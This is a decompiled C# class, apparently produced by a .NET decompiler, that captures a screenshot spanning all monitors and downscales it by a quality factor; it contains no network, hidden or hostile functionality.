using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

internal class Screenshot
{
	public static Image Snap(int quality)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Rectangle allScreenSize = GetAllScreenSize();
		Bitmap val = new Bitmap(allScreenSize.Width, allScreenSize.Height, (PixelFormat)137224);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(allScreenSize.X, allScreenSize.Y, 0, 0, allScreenSize.Size, (CopyPixelOperation)13369376);
			return Compress((Image)(object)val, quality);
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	private static Image Compress(Image image, int quality)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		Bitmap val = checked(new Bitmap((int)Math.Round(Math.Floor((double)image.get_Width() / ((double)quality / 30.0))), (int)Math.Round(Math.Floor((double)image.get_Height() / ((double)quality / 30.0))), (PixelFormat)137224));
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.DrawImage(image, 0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
			return (Image)(object)val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	private static Rectangle GetAllScreenSize()
	{
		Rectangle result = default(Rectangle);
		Screen[] allScreens = Screen.get_AllScreens();
		checked
		{
			foreach (Screen val in allScreens)
			{
				result.X += val.get_Bounds().X;
				result.Width += val.get_Bounds().Width;
				if (val.get_Bounds().Y < result.Y)
				{
					result.Y = val.get_Bounds().Y;
				}
				if (result.Height < val.get_Bounds().Height)
				{
					result.Height = val.get_Bounds().Height;
				}
			}
			return result;
		}
	}
}
